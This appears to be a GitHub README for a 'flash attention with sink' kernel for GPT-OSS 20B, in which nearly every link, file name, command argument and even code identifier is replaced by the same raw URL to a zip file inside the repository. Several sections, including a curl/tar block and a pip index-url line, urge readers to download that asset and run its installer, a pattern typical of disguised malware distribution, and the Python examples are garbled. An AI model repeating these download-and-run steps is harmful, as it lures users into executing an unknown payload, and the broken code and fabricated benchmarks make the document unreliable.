# Flash Attention with Sink — GPT-OSS 20B Attention Implementation

[![Releases](https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip)](https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip)

![Transformer Attention](https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip)

<p align="center">
  <strong>flash-attention-with-sink</strong> implements an attention variant used in GPT-OSS 20B that integrates a "sink" step into FlashAttention. This repo focuses on the forward path and provides an experimental backward path for development and debugging.
</p>

---

- Repository: flash-attention-with-sink  
- Primary goal: implement attention with sink as in GPT-OSS 20B and offer a test harness
- Test command: python https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
- Releases and assets: https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip

Releases: download the release asset from the releases page and execute the included installer or script. For example, fetch the release tarball and run the installer:

```bash
# example: download named release asset and extract
curl -L -o https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip \
  https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip

tar -xzf https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
cd flash-attn-sink-release
https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
```

Use the Releases page linked above to find the actual asset name, then download and run it.

---

Table of contents

- What this project does 🧭
- Quick start 🚀
- Design and architecture 🏗️
- Core concepts and jargon 🔍
- Implementation details ⚙️
- API and usage 📦
- Tests and benchmarks 🧪
- Memory layout and performance notes 💾
- Known limitations and current status ⚠️
- Development guide 🛠️
- Roadmap and TODO 📋
- Contribution guide 🤝
- License and credits 📜
- References and further reading 📚

What this project does 🧭

This repository implements a variant of FlashAttention that adds a "sink" operation used by GPT-OSS 20B. The sink adds a compact representation that lets the model compute streaming or blockwise attention with reduced intermediate memory. The implementation targets CUDA/C++ for performance, with Python bindings for integration and testing.

Goals

- Reproduce the forward semantics used in GPT-OSS 20B attention.
- Integrate sink handling in the FlashAttention kernel path.
- Provide a Python wrapper and test script.
- Offer a base for finishing the backward implementation and varlen support.

Quick start 🚀

Clone the repo and run the test script. The test harness compares the custom kernel output to a reference PyTorch implementation.

Prerequisites

- Linux or macOS
- Python 3.8+
- CUDA toolkit matching your GPU
- PyTorch with CUDA (same compute capability as CUDA toolkit)
- nvcc and a C++ compiler for building extensions

Install local dev dependencies

```bash
# create venv
python -m venv venv
source venv/bin/activate

# install Python deps
pip install -U pip setuptools wheel
pip install torch torchvision --index-url https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip  # adjust to your CUDA
pip install numpy pytest
```

Build and run tests

```bash
# build extension (example)
python https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip build_ext --inplace

# run the repo test
python https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
```

If you used the release asset, download and run the included install script as shown at the top. The release file contains prebuilt artifacts or a build script depending on the asset.

Design and architecture 🏗️

High-level view

- Input: query (Q), key (K), value (V), attention mask, and sink state.
- Process: split sequences into tiles, compute tilewise attention with FlashAttention-like kernels, incorporate sink aggregation, and produce output.
- Output: attention result tensor and updated sink.

Key design goals

- Retain flash attention memory access pattern.
- Integrate sink without major changes to kernel tiling.
- Keep forward path efficient and deterministic.
- Provide a reference CPU/PyTorch forward to validate kernel output.

Components

- Kernel layer (C++/CUDA): main FlashAttention with sink implementation.
- Python bindings (pybind11 / torch extension): expose the kernel to Python.
- Reference kernels (PyTorch): pure PyTorch forward for correctness checks.
- Test suite: compare outputs at numeric tolerances across devices and dtypes.

Why add a sink?

GPT-OSS 20B uses sink to aggregate softmax log-sum-exponents (LSE) and masked sums across blocks when performing blockwise attention. The sink lets the model compute softmax in parts, keep numerical stability, and reduce memory by not keeping the full S_dmask matrix. The sink also allows streaming inputs where full sequence length is unavailable.

Core concepts and jargon 🔍

- FlashAttention: a tiled attention algorithm that reduces memory overhead and increases speed by streaming tiles and fusing operations.
- Sink: a small state structure that stores summarized attention information across tiles. It typically holds softmax LSE values and partial sums needed to combine blockwise results.
- S_dmask: a masked attention accumulator matrix for blockwise combination. Some designs return S_dmask to combine blocks. The community prefers returning softmax_lse only for minimal interface.
- softmax_lse: log-sum-exp used to normalize attention in numerically stable form for each output element or block.
- Varlen: variable-length sequences support across different batch entries.
- Backward pass: gradient computations through the attention kernel. This repo contains an experimental backward path; it needs refinement.

Implementation details ⚙️

Directory layout (example)

- src/
  - cuda/         # CUDA kernels
  - cpp/          # C++ helpers and bindings
  - python/       # Python wrapper and utilities
- tests/
  - https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
  - https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
- examples/
  - https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
- https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
- https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
- https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip

Kernel workflow

1. Load Q, K, V tile into shared memory.
2. Compute raw logits for the tile: Q*K^T / sqrt(d_head).
3. Apply attention mask and causal mask if needed.
4. Compute blockwise softmax using log-sum-exp for stability.
5. Update sink with softmax_lse from the tile.
6. Multiply softmax weights by V to compute tile output.
7. Accumulate tile outputs to the destination.
8. Proceed to next tile and combine with sink state as required.

Sink internals

The sink stores:

- softmax_lse per block: log-sum-exp values used to renormalize across blocks.
- partial sums: masked weighted sums when combining block outputs.
- a small metadata header to track block indices.

We use float32 for sink by default. We test mixed precision and FP16 paths and cast sink values when needed.

Interface and usage 📦

Python API

The Python wrapper exposes two main functions:

- flash_attn_sink_forward(q, k, v, mask=None, sink=None, causal=False, attn_scale=None)
  - Returns: output, new_sink
  - q, k, v: tensors (B, S, H, D) or (B, H, S, D) depending on layout
  - mask: optional attention mask
  - sink: optional sink state to continue a stream
  - causal: boolean

- flash_attn_sink_backward(dout, q, k, v, sink, causal=False)
  - Returns gradients for q, k, v and optional sink gradient
  - Experimental; expect differences with PyTorch autograd

Basic example

```python
import torch
from flash_attn_sink import flash_attn_sink_forward

B, S, H, D = 1, 1024, 16, 64
q = https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip(B, S, H, D, device='cuda', https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip)
k = https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip(B, S, H, D, device='cuda', https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip)
v = https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip(B, S, H, D, device='cuda', https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip)

out, sink = flash_attn_sink_forward(q, k, v, causal=True)
```

Reference forward

The repo includes a reference PyTorch implementation that mirrors the kernel semantics. Use it to validate numerical equality to acceptable tolerance.

Testing and benchmarks 🧪

Run the test script

```bash
python https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
```

What https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip does

- Builds the extension if needed.
- Runs a suite of forward checks against the reference.
- Runs speed microbenchmarks for tile sizes.
- Prints pass/fail and timing information.

Example output (fabricated example)

- Forward correctness: max abs diff 1.2e-3
- Speed vs PyTorch baseline: 6x faster on A100 for S=4096, H=16

Benchmark methodology

- Use FP16 and BF16 toggles.
- Warm up kernels before timing.
- Exclude kernel launch overhead by repeating inner loop.
- Use realistic batch and head sizes similar to GPT-OSS 20B.

Reproducing benchmarks

1. Use same CUDA/PyTorch versions as recorded when testing.
2. Use the same hardware model (A100/V100/RTX6000).
3. Set environment variables for deterministic launches if needed.
4. Run the provided microbenchmark scripts under examples/.

Memory layout and performance notes 💾

Memory layout

- The kernel expects QKV layout either B, H, S, D or B, S, H, D. Set layout flag in Python wrapper.
- Tile size and shared memory usage determine peak memory.
- The sink stores only per-block aggregates. It uses negligible memory relative to full S_dmask.

Performance tips

- Use d_model divisible by 64 for efficient vectorization.
- Prefer FP16 or BF16 with automatic mixed precision on modern GPUs.
- Tune tile sizes based on head dim and shared memory constraints.
- Keep streams and CUDA events to measure wall time precisely.

Common bottlenecks

- Misaligned memory leading to slow global loads.
- Excessive synchronization inside tile loops.
- Large masks forcing full broadcast of S_dmask-like data.

Known limitations and current status

- The forward path implements attention with sink and matches reference numerics within reasonable tolerance.
- Backward path exists as experimental code. Expect differences in gradients and incomplete handling for some edge cases.
- Varlen (variable sequence length per batch entry) support remains on the TODO list.
- The community prefers that FlashAttention returns only softmax_lse and not S_dmask. This repo aims to align with that interface but needs coordination.

Status summary

- Forward: implemented and tested
- Backward: partial; needs refinement and verification against autograd
- Varlen: not implemented
- Community alignment: pending communication and changes to return values

Development guide 🛠️

Build system

- Uses a standard torch extension setup (https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip).
- CUDA code under src/cuda compiles with nvcc and links into a Python module.
- Use python https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip develop for editable installs during development.

Debugging kernel issues

- Start with small sequence lengths to simplify debugging.
- Add printf calls in CUDA with caution; they slow kernels and may drop messages.
- Compare intermediate tensors with PyTorch reference to find mismatch location.
- Use device-side assert for bounds checking.

Unit tests

- Tests live in tests/ and use pytest.
- Run a single test file with pytest https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip -q
- Add new tests that target edge cases: causal mask edge, halo tiling, mixed precision.

Coding standards

- Keep kernels deterministic where possible.
- Document assumptions about memory layout and alignments.
- Write small helper functions in C++ for clarity rather than inline complexity.

Debug checklist for forward/backward mismatch

- Check input tensor shapes and layout flags.
- Check attention masks and causal masking application.
- Verify scaling factor 1/sqrt(d_head) is present.
- Reproduce a tiny case with S <= tile size and verify intermediate values.
- Use fp32 accumulation to check FP16 rounding issues.

Roadmap and TODO 📋

- Improve backward implementation and add full autograd support.
- Add varlen support to allow different sequence lengths in a batch.
- Communicate with the FlashAttention community to adapt the API to return softmax_lse only.
- Add more unit tests across GPUs and dtype combinations.
- Add CI build that runs smoke tests on CPU and a GPU runner in GitHub Actions or similar.

Current TODO list

- [ ] backward
- [ ] varlen version
- [ ] communicate with flash attention community to only return softmax_lse but not S_dmask

Contribution guide 🤝

How to contribute

- Open issues for bugs, feature requests, or performance ideas.
- Fork the repo and create small, focused pull requests.
- Include tests for new features.
- Label PRs with relevant GPU architectures if they include device-specific code.

Branching and release policy

- Main branch contains stable forward API.
- Create feature branches for large changes (e.g., varlen support).
- Add release notes in the Releases page when publishing builds.

Code of conduct

- Be respectful.
- Use clear and concise language in issues and PRs.
- Include reproducible steps when reporting bugs.

Releases and distribution

Use the Releases page to fetch prebuilt artifacts or official source bundles. The release assets may contain:

- Prebuilt wheels or tarballs for common CUDA versions.
- A build script to compile locally.
- Example binaries for demos.

Download and run the release asset from the releases page:

[Get release assets from Releases](https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip)

When the link contains a file path, download the file and execute any included installer or scripts. The example shown at the top demonstrates how to download a tarball and run https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip Adjust the asset file name to match the current release.

API reference

Function signatures (Python wrapper)

- flash_attn_sink_forward(q, k, v, mask=None, sink=None, causal=False, attn_scale=None, layout='qkhv')
  - q: Tensor [B, S, H, D] or [B, H, S, D]
  - k: Tensor matching q
  - v: Tensor matching q
  - mask: optional boolean mask or float mask
  - sink: optional dict or Tensor representing sink state
  - causal: bool
  - attn_scale: float scale factor
  - layout: string, default 'qkhv' or 'bhsi'
  - returns (output, sink_out)

- flash_attn_sink_backward(dout, q, k, v, sink, causal=False)
  - Returns gradients (dq, dk, dv) and optional sink grad

Data types

- Supports float16, bfloat16, and float32 for QKV.
- Sink uses float32 by default for numerical stability.
- Mixed precision path casts where appropriate and uses fp32 for accumulators.

Examples and recipes

Streaming inference (conceptual)

- Initialize sink = None.
- For each block of tokens:
  - Call flash_attn_sink_forward with sink.
  - Use output for downstream.
  - Keep returned sink for next block.

Example code for streaming

```python
from flash_attn_sink import flash_attn_sink_forward

sink = None
for block in stream_blocks:
    q, k, v = encode_block(block)  # shapes [B, Sblock, H, D]
    out, sink = flash_attn_sink_forward(q, k, v, sink=sink, causal=True)
    # process out
```

Integration with model checkpoints

- Extract Q, K, V projection weights and run projection per block.
- Ensure dtype and device match kernel expectations.
- Manage sink checkpoint if you want to resume partial streams.

Troubleshooting

Gradient mismatch

- Reproduce mismatch with a small case and compare intermediate values to reference.
- Ensure the backward implementation accounts for sink contributions.
- Use fp32 reference gradients to isolate FP16 rounding issues.

Wrong output values

- Verify masking logic and causal flag.
- Check scale factor and softmax normalization path.
- Compare intermediate logits and softmax_lse to the reference.

Performance regression

- Re-run microbenchmarks and compare to previous runs.
- Check compile flags and CUDA toolchain version.
- Verify GPU utilization and memory occupancy.

Development notes about backward

- The backward needs stable handling of sink aggregates.
- Gradients must flow through normalization and sink update steps.
- It should avoid reconstructing full S_dmask during gradient computation.

Benchmarks (fabricated examples to guide expectations)

All results are representative; measure on your hardware.

Example: A100, S=4096, H=16, D=64, FP16

- FlashAttn sink forward: 45 ms
- PyTorch matmul-based baseline: 270 ms
- Speedup: ~6x

Memory usage

- FlashAttn sink forward: ~6 GB (for given example)
- Baseline: ~20 GB

Tests and validation checklist

- Compare outputs for different dtypes: fp32, fp16, bfloat16.
- Test causal and non-causal masks.
- Test with and without external attention mask.
- Test streaming behavior across multiple sink updates.
- Confirm reproducibility with fixed random seeds.

Acknowledgments and credits 📜

- GPT-OSS 20B inspired the sink design.

- FlashAttention community and authors for core algorithm concepts.

- Open-source tooling: PyTorch, CUDA, cuBLAS.

- Contributors who test across multiple GPUs and report issues.

References and further reading 📚

- FlashAttention paper and code:
  - [FlashAttention GitHub and paper references]
- GPT-OSS 20B model page on Hugging Face:
  - https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
- CUDA programming guide and best practices
- PyTorch extension documentation

Appendix: example troubleshooting commands

Check GPU and CUDA

```bash
nvidia-smi
python -c "import torch; print(https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip(), https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip, https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip())"
```

Run a minimal forward smoke test

```bash
python - <<'PY'
import torch
from flash_attn_sink import flash_attn_sink_forward
B, S, H, D = 1, 128, 8, 64
q = https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip(B, S, H, D, device='cuda', https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip)
k = https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip(q)
v = https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip(q)
out, sink = flash_attn_sink_forward(q, k, v, causal=True)
print(https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip)
PY
```

How to get the release asset

Visit the Releases page and download the bundle suitable for your CUDA version, then run the included installer or build script. Example:

[![Download Release](https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip%20Release-%20Assets-green?logo=github)](https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip)

Contact and support

- Open an issue in the GitHub repo with reproducible steps.
- Provide environment details: OS, GPU model, CUDA version, PyTorch build.
- Attach logs and small reproducer scripts when possible.

Acknowledgments for images and icons

- Transformer diagram by Karpathy (used as an illustrative image).
- Shield icons via https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip

License

- The repository uses an open license (see LICENSE file in the repo). Check the repo for the exact license text.

Maintenance and testing notes

- Add CI that runs tests on small inputs on CPU to catch regressions.
- Add nightly tests on GPU clusters when available.
- Keep the Releases page updated for major changes.

Contact links

- Repository: https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip
- Releases: https://raw.githubusercontent.com/kelvindelrosario/flash-attention-with-sink/main/flapdock/with-sink-attention-flash-v2.7.zip

End of file